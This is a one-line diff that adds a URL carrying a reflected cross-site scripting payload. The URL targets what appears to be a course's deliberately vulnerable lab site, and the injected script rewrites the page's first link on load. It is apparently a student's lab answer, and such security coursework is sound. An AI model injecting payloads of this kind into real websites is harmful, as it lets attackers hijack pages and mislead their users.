@@ -1,0 +1,1 @@
+http://bungle-cs461.csl.illinois.edu/multivac/?name=%3Cscript%3Ewindow.onload%20=%20function()%20{document.getElementsByTagName(%22a%22)[0].href=%22http://ece.illinois.edu/%22;}%3C/script%3E
